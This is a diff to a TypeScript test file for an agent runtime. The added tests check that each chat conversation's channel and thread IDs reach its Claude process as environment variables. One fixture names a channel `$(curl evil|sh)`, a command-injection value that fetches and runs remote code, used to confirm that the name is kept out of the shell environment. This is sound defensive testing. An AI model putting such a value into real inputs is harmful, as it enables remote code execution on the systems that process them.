@@ -11,6 +11,7 @@ import {
   promptSections,
 } from "../../features/agents/activity-transcript";
 import { pubkeyOf } from "../../features/agents/membership";
+import { canonicalPublicKey } from "../../shared/identity/public-key";
 import { ownerReads } from "../../features/agents/reads";
 import { localStore } from "../../features/agents/state";
 import {
@@ -111,6 +112,8 @@ function setup(
     /** Claude processes the host runs at once before it refuses one, as it
      * refuses past its limit on all plugins' processes. */
     claudeLimit?: number;
+    /** Stream channels the community lists besides `channel`. */
+    channels?: readonly Readonly<{ id: string; name: string }>[];
   }> = {},
 ) {
   const fake = fakeSpawn();
@@ -208,6 +211,11 @@ function setup(
             members: [],
             ...(options.pending?.has(channel) ? { pending: true } : {}),
           },
+          ...(options.channels ?? []).map((listed) => ({
+            ...listed,
+            channelType: "stream",
+            members: [],
+          })),
         ],
       }),
     },
@@ -2988,6 +2996,95 @@ it("replaces the spare when no agent runs where it was started", async () => {
   expect(low?.options.args).toEqual(
     expect.arrayContaining(["--model", "sonnet", "--effort", "low"]),
   );
+});
+
+describe("each conversation's Buzz context in its commands", () => {
+  const one = "11111111-1111-4111-8111-111111111111";
+  const two = "22222222-2222-4222-8222-222222222222";
+  const npub = canonicalPublicKey(alice);
+  const mention = (id: string, channelId: string, root?: string) =>
+    message(id, "@Claude look", {
+      created_at: 110,
+      tags: [
+        ["h", channelId],
+        ...(root ? [["e", root, "", "reply"]] : []),
+        ["p", self],
+      ],
+    });
+
+  it("names its own thread, in a spare and in a reused process", async () => {
+    const rootOne = message("1", "Build is red", { tags: [["h", one]] });
+    const rootTwo = message("5", "Deploy is stuck", { tags: [["h", two]] });
+    const { runtime, deliver, claudes } = setup([rootOne], {
+      channels: [
+        { id: one, name: "ops" },
+        // A shell would run this from a prompt that shows it.
+        { id: two, name: "$(curl evil|sh)" },
+      ],
+    });
+    runtime.sync([
+      { key: self, pubkey: self, config: DEFAULT_CONFIG } as Agent,
+    ]);
+    await flush(10);
+    const [spare] = claudes();
+    await deliver(
+      { type: "mention", event: mention("2", one, rootOne.id) },
+      { channelId: one },
+    );
+    await flush(10);
+    await deliver(
+      { type: "mention", event: mention("6", two, rootTwo.id) },
+      { channelId: two },
+    );
+    await flush(10);
+    await deliver(
+      { type: "mention", event: mention("3", one, rootOne.id) },
+      { channelId: one },
+    );
+    await flush(10);
+    const working = claudes().filter((process) => process.prompts.length);
+    expect(working).toHaveLength(2);
+    // The first conversation took the spare, started before it was known.
+    expect(working[0]).toBe(spare);
+    // Neither spare started with a conversation, not even the one taken
+    // before it.
+    for (const process of working)
+      expect(process.options.env?.BUZZ_CHANNEL_ID).toBeUndefined();
+    const threadOne = {
+      BUZZ_CHANNEL_ID: one,
+      BUZZ_CHANNEL: "ops",
+      BUZZ_NPUB: npub,
+      BUZZ_THREAD_ID: rootOne.id,
+    };
+    expect(working[0]?.shellEnvs).toEqual([threadOne, threadOne]);
+    expect(working[1]?.shellEnvs).toEqual([
+      {
+        ...threadOne,
+        BUZZ_CHANNEL_ID: two,
+        BUZZ_CHANNEL: two,
+        BUZZ_THREAD_ID: rootTwo.id,
+      },
+    ]);
+  });
+
+  it("names no thread for a session the whole channel shares", async () => {
+    const root = message("1", "Build is red", { tags: [["h", one]] });
+    const config = { ...DEFAULT_CONFIG, scope: "channel" };
+    const { deliver, claudes } = setup([root], {
+      channels: [{ id: one, name: "ops" }],
+    });
+    await deliver(
+      { type: "mention", event: mention("2", one, root.id) },
+      { channelId: one, config },
+    );
+    await flush(10);
+    const [claude] = claudes().filter((process) => process.prompts.length);
+    // Started for its conversation, so its launch carries the variables.
+    expect(claude?.options.env?.BUZZ_CHANNEL_ID).toBe(one);
+    expect(claude?.shellEnvs).toEqual([
+      { BUZZ_CHANNEL_ID: one, BUZZ_CHANNEL: "ops", BUZZ_NPUB: npub },
+    ]);
+  });
 });
 
 it("tells the owner, not the asking sibling, when a sibling's turn fails", async () => {
